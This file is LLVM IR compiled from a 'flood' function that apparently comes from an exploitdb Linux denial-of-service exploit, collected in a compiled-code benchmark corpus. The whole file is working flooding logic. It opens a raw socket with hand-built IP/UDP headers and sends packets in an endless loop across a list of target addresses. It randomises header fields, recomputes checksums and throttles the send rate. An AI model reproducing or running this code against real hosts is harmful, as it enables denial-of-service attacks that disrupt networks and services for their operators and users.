; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_44264.c_flood.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_44264.c_flood.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.thread_data = type { %struct.list*, %struct.sockaddr_in }
%struct.list = type { %struct.TYPE_6__, %struct.list* }
%struct.TYPE_6__ = type { %struct.TYPE_5__ }
%struct.TYPE_5__ = type { i32 }
%struct.sockaddr_in = type { %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32 }
%struct.iphdr = type { i32, i8*, i32, i32, i32 }
%struct.udphdr = type { i32 }
%struct.sockaddr = type { i32 }

@MAX_PACKET_SIZE = common dso_local global i32 0, align 4
@PF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [28 x i8] c"Could not open raw socket.\0A\00", align 1
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [43 x i8] c"Error: setsockopt() - Cannot set HDRINCL!\0A\00", align 1
@pps = common dso_local global i32 0, align 4
@limiter = common dso_local global i32 0, align 4
@sleeptime = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @flood(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.thread_data*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i64, align 8
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca %struct.udphdr*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.list*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %14 = load i8*, i8** %2, align 8
  %15 = bitcast i8* %14 to %struct.thread_data*
  store %struct.thread_data* %15, %struct.thread_data** %3, align 8
  %16 = load i32, i32* @MAX_PACKET_SIZE, align 4
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %4, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %5, align 8
  %20 = bitcast i8* %19 to %struct.iphdr*
  store %struct.iphdr* %20, %struct.iphdr** %6, align 8
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = bitcast %struct.iphdr* %21 to i8*
  %23 = getelementptr i8, i8* %22, i64 32
  %24 = bitcast i8* %23 to %struct.udphdr*
  store %struct.udphdr* %24, %struct.udphdr** %7, align 8
  %25 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %26 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %25, i32 0, i32 1
  %27 = bitcast %struct.sockaddr_in* %8 to i8*
  %28 = bitcast %struct.sockaddr_in* %26 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %27, i8* align 8 %28, i64 4, i1 false)
  %29 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %30 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %29, i32 0, i32 0
  %31 = load %struct.list*, %struct.list** %30, align 8
  store %struct.list* %31, %struct.list** %9, align 8
  %32 = load i32, i32* @PF_INET, align 4
  %33 = load i32, i32* @SOCK_RAW, align 4
  %34 = load i32, i32* @IPPROTO_TCP, align 4
  %35 = call i32 @socket(i32 %32, i32 %33, i32 %34)
  store i32 %35, i32* %10, align 4
  %36 = load i32, i32* %10, align 4
  %37 = icmp slt i32 %36, 0
  br i1 %37, label %38, label %42

38:                                               ; preds = %1
  %39 = load i32, i32* @stderr, align 4
  %40 = call i32 @fprintf(i32 %39, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0))
  %41 = call i32 @exit(i32 -1) #5
  unreachable

42:                                               ; preds = %1
  %43 = call i32 @time(i32* null)
  %44 = call i32 @init_rand(i32 %43)
  %45 = load i32, i32* @MAX_PACKET_SIZE, align 4
  %46 = call i32 @memset(i8* %19, i32 0, i32 %45)
  %47 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %48 = call i32 @setup_ip_header(%struct.iphdr* %47)
  %49 = load %struct.udphdr*, %struct.udphdr** %7, align 8
  %50 = call i32 @setup_udp_header(%struct.udphdr* %49)
  %51 = call i32 (...) @rand()
  %52 = srem i32 %51, 65535
  %53 = sub nsw i32 %52, 1026
  %54 = call i32 @htons(i32 %53)
  %55 = load %struct.udphdr*, %struct.udphdr** %7, align 8
  %56 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %55, i32 0, i32 0
  store i32 %54, i32* %56, align 4
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %58 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 4
  %60 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %61 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %60, i32 0, i32 4
  store i32 %59, i32* %61, align 8
  %62 = load %struct.list*, %struct.list** %9, align 8
  %63 = getelementptr inbounds %struct.list, %struct.list* %62, i32 0, i32 0
  %64 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %63, i32 0, i32 0
  %65 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %64, i32 0, i32 0
  %66 = load i32, i32* %65, align 8
  %67 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %68 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %67, i32 0, i32 3
  store i32 %66, i32* %68, align 4
  %69 = bitcast i8* %19 to i16*
  %70 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %71 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %70, i32 0, i32 0
  %72 = load i32, i32* %71, align 8
  %73 = ashr i32 %72, 1
  %74 = call i8* @csum(i16* %69, i32 %73)
  %75 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %76 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %75, i32 0, i32 1
  store i8* %74, i8** %76, align 8
  store i32 1, i32* %11, align 4
  store i32* %11, i32** %12, align 8
  %77 = load i32, i32* %10, align 4
  %78 = load i32, i32* @IPPROTO_IP, align 4
  %79 = load i32, i32* @IP_HDRINCL, align 4
  %80 = load i32*, i32** %12, align 8
  %81 = call i64 @setsockopt(i32 %77, i32 %78, i32 %79, i32* %80, i32 4)
  %82 = icmp slt i64 %81, 0
  br i1 %82, label %83, label %87

83:                                               ; preds = %42
  %84 = load i32, i32* @stderr, align 4
  %85 = call i32 @fprintf(i32 %84, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i64 0, i64 0))
  %86 = call i32 @exit(i32 -1) #5
  unreachable

87:                                               ; preds = %42
  %88 = call i32 @time(i32* null)
  %89 = call i32 @init_rand(i32 %88)
  store i32 0, i32* %13, align 4
  br label %90

90:                                               ; preds = %130, %87
  br label %91

91:                                               ; preds = %90
  %92 = load i32, i32* %10, align 4
  %93 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 8
  %96 = load %struct.list*, %struct.list** %9, align 8
  %97 = getelementptr inbounds %struct.list, %struct.list* %96, i32 0, i32 0
  %98 = bitcast %struct.TYPE_6__* %97 to %struct.sockaddr*
  %99 = call i32 @sendto(i32 %92, i8* %19, i32 %95, i32 0, %struct.sockaddr* %98, i32 4)
  %100 = load %struct.list*, %struct.list** %9, align 8
  %101 = getelementptr inbounds %struct.list, %struct.list* %100, i32 0, i32 1
  %102 = load %struct.list*, %struct.list** %101, align 8
  store %struct.list* %102, %struct.list** %9, align 8
  %103 = load %struct.list*, %struct.list** %9, align 8
  %104 = getelementptr inbounds %struct.list, %struct.list* %103, i32 0, i32 0
  %105 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %104, i32 0, i32 0
  %106 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 8
  %108 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %109 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %108, i32 0, i32 3
  store i32 %107, i32* %109, align 4
  %110 = call i32 (...) @rand_cmwc()
  %111 = call i32 @htonl(i32 %110)
  %112 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 2
  store i32 %111, i32* %113, align 8
  %114 = bitcast i8* %19 to i16*
  %115 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %116 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %115, i32 0, i32 0
  %117 = load i32, i32* %116, align 8
  %118 = ashr i32 %117, 1
  %119 = call i8* @csum(i16* %114, i32 %118)
  %120 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %121 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %120, i32 0, i32 1
  store i8* %119, i8** %121, align 8
  %122 = load i32, i32* @pps, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* @pps, align 4
  %124 = load i32, i32* %13, align 4
  %125 = load i32, i32* @limiter, align 4
  %126 = icmp uge i32 %124, %125
  br i1 %126, label %127, label %130

127:                                              ; preds = %91
  store i32 0, i32* %13, align 4
  %128 = load i32, i32* @sleeptime, align 4
  %129 = call i32 @usleep(i32 %128)
  br label %130

130:                                              ; preds = %127, %91
  %131 = load i32, i32* %13, align 4
  %132 = add i32 %131, 1
  store i32 %132, i32* %13, align 4
  br label %90
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @socket(i32, i32, i32) #3

declare dso_local i32 @fprintf(i32, i8*) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i32 @init_rand(i32) #3

declare dso_local i32 @time(i32*) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @setup_ip_header(%struct.iphdr*) #3

declare dso_local i32 @setup_udp_header(%struct.udphdr*) #3

declare dso_local i32 @htons(i32) #3

declare dso_local i32 @rand(...) #3

declare dso_local i8* @csum(i16*, i32) #3

declare dso_local i64 @setsockopt(i32, i32, i32, i32*, i32) #3

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #3

declare dso_local i32 @htonl(i32) #3

declare dso_local i32 @rand_cmwc(...) #3

declare dso_local i32 @usleep(i32) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
